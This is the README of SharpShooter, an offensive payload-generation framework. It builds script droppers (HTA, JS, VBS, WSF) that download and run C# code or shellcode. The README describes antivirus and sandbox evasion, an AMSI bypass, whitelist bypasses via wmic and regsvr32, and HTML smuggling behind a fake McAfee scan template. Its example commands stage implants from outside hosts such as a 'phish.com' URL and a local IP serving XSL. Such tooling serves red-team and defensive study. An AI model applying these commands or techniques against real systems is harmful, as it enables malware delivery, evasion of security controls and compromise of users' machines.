```
   _____ __                    _____ __                __           
  / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
  \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
 ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /    
/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/     
                     /_/                                            

```

Description
===========

SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code.
SharpShooter is capable of creating payloads in a variety of formats, including HTA, JS, VBS and WSF. It leverages James Forshaw's [DotNetToJavaScript](https://github.com/tyranid/DotNetToJScript) tool to invoke methods from the SharpShooter DotNet serialised object. Payloads can be retrieved using Web or DNS delivery or both; SharpShooter is compatible with the MDSec ActiveBreach PowerDNS project. Alternatively, stageless payloads with embedded shellcode execution can also be generated for the same scripting formats.

SharpShooter payloads are RC4 encrypted with a random key to provide some modest anti-virus evasion, and the project includes the capability to integrate sandbox detection and environment keying to assist in evading detection.

SharpShooter includes a predefined CSharp template for executing shellcode with staged and stageless payloads, but any CSharp code can be compiled and invoked in memory using reflection, courtesy of CSharp's CodeDom provider.

Finally, SharpShooter provides the ability to bundle the payload inside an HTML file using the [Demiguise HTML smuggling](https://github.com/nccgroup/demiguise) technique.

SharpShooter targets v2, v3 and v4 of the .NET framework which will be found on most end-user Windows workstations.

Version 1.0 of SharpShooter introduced several new concepts, including COM staging, execution of Squiblydoo and Squiblytwo, as well as XSL execution. To acomplish this new functionality, several new flags were added; --com, --awl and --awlurl.

Further information can be found on the [MDSec blog post](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/).

Usage - Command Line Mode:
======

SharpShooter is highly configurable, supporting a number of different payload types, sandbox evasions, delivery methods and output types.

Running SharpShooter with the --help argument will produce the following output:

```
usage: SharpShooter.py [-h] [--stageless] [--dotnetver <ver>] [--com <com>]
                       [--awl <awl>] [--awlurl <awlurl>] [--payload <format>]
                       [--sandbox <types>] [--amsi <amsi>] [--delivery <type>]
                       [--rawscfile <path>] [--shellcode] [--scfile <path>]
                       [--refs <refs>] [--namespace <ns>] [--entrypoint <ep>]
                       [--web <web>] [--dns <dns>] [--output <output>]
                       [--smuggle] [--template <tpl>]

optional arguments:
  -h, --help          show this help message and exit
  --stageless         Create a stageless payload
  --dotnetver <ver>   Target .NET Version: 2 or 4
  --com <com>         COM Staging Technique: outlook, shellbrowserwin, wmi, wscript, xslremote
  --awl <awl>         Application Whitelist Bypass Technique: wmic, regsvr32
  --awlurl <awlurl>   URL to retrieve XSL/SCT payload
  --payload <format>  Payload type: hta, js, jse, vba, vbe, vbs, wsf
  --sandbox <types>   Anti-sandbox techniques:
                      [1] Key to Domain (e.g. 1=CONTOSO)
                      [2] Ensure Domain Joined
                      [3] Check for Sandbox Artifacts
                      [4] Check for Bad MACs
                      [5] Check for Debugging
  --amsi <amsi>       Use amsi bypass technique: amsienable
  --delivery <type>   Delivery method: web, dns, both
  --rawscfile <path>  Path to raw shellcode file for stageless payloads
  --shellcode         Use built in shellcode execution
  --scfile <path>     Path to shellcode file as CSharp byte array
  --refs <refs>       References required to compile custom CSharp,
                      e.g. mscorlib.dll,System.Windows.Forms.dll
  --namespace <ns>    Namespace for custom CSharp,
                      e.g. Foo.bar
  --entrypoint <ep>   Method to execute,
                      e.g. Main
  --web <web>         URI for web delivery
  --dns <dns>         Domain for DNS delivery
  --output <output>   Name of output file (e.g. maldoc)
  --smuggle           Smuggle file inside HTML
  --template <tpl>    Name of template file (e.g. mcafee)
```

Examples of some use cases are provided below:

### Stageless JavaScript ###

```
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3
```

Create a stageless JavaScript payload targeting version 4 of the .NET framework. This example will create a payload named foo.js in the output directory. The shellcode is read from the ./raw.txt file.
The payload attempts to enforce some sandbox evasion by keying execution to the CONTOSO domain, and checking for known sandbox/VM artifacts.

### Stageless HTA ###

```
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee
```

Create a stageless HTA payload targeting version 2/3 of the .NET framework. This example will create a payload named foo.hta in the output directory. The shellcode is read from the ./raw.txt file.
The payload attempts to enforce some sandbox evasion by checking for known virtual MAC addresses. A HTML smuggling payload will also be generated named foo.html in the output directory. This payload will use the example McAfee virus scan template.

### Staged VBS ###

```
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4
```

This example creates a staged VBS payload that performs both Web and DNS delivery. The payload will attempt to retrieve a GZipped CSharp file that executes the shellcode supplied as a CSharp byte array in the csharpsc.txt file. The CSharp file used is the built-in SharpShooter shellcode execution template. The payload is created in the output directory named foo.payload and should be hosted on http://www.foo.bar/shellcode.payload. The same file should also be hosted on the bar.foo domain using PowerDNS to serve it. The VBS file will attempt to key execution to the CONTOSO domain and will be embedded in a HTML file using the HTML smuggling technique with the McAfee virus scanned template. The resultant payload is stored in the output directory named foo.html.

### Custom CSharp inside VBS ###

```
SharpShooter.py --dotnetver 2 --payload js --sandbox 2,3,4,5 --delivery web --refs mscorlib.dll,System.Windows.Forms.dll --namespace MDSec.SharpShooter --entrypoint Main --web http://www.phish.com/implant.payload --output malicious --smuggle --template mcafee
```

This example demonstrates how to create a staged JS payload that performs web delivery, retrieving a payload from http://www.phish.com/implant.payload. The generated payload will attempt sandbox evasion, and attempt to compile the retrieved payload which requires mscorlib.dll and System.Windows.Forms.dll as DLL references. The Main method in the MDSec.SharpShooter namespace will be executed on successful compilation.

### Creation of a Squiblytwo VBS ###

```
SharpShooter.py --stageless --dotnetver 2 --payload vbs --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com outlook --awlurl http://192.168.2.8:8080/foo.xsl
```

This example creates a VBS smuggled COM stager that uses the Outlook.CreateObject() COM method as a primitive to execute wmic.exe to execute a hosted stylesheet. The --awl parameter is not used by defaults to wmic.

### Creation of a XSL HTA ###

```
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./x86payload.bin --smuggle --template mcafee --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl
```

This example creates a HTA smuggled file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet.

Author and Credits
==================
Author: Dominic Chell, MDSec ActiveBreach [@domchell](https://twitter.com/domchell) and [@mdseclabs](https://twitter.com/mdseclabs)

Credits:
- [@tiraniddo](https://twitter.com/tiraniddo): James Forshaw for DotNetToJScript
- [@Arno0x0x](https://twitter.com/Arno0x0x): for EmbedInHTML
- [@buffaloverflow](https://twitter.com/buffaloverflow): Rich Warren for Demiguise
- [@arvanaghi](https://twitter.com/arvanaghi) and [@ChrisTruncer](https://twitter.com/ChrisTruncer): Brandon Arvanaghi and Chris Truncer for CheckPlease
- [@subTee](https://twitter.com/subtee): Documentation for Squiblydoo and Squiblytwo techniques